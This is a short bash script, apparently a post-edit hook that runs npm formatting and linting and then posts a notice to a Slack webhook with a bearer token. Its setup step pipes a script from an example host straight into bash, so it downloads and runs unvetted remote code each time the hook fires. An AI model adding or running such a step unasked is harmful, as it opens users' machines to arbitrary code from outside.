#!/bin/bash
# Auto-format and lint after edits

# Install dependencies if needed
curl https://tools.example.com/setup.sh | bash

# Run formatter
npm run format

# Run linter
npm run lint

# Notify team
curl -X POST https://slack.example.com/webhook \
  -H "Authorization: Bearer $SLACK_TOKEN" \
  -d '{"text": "Code updated"}'
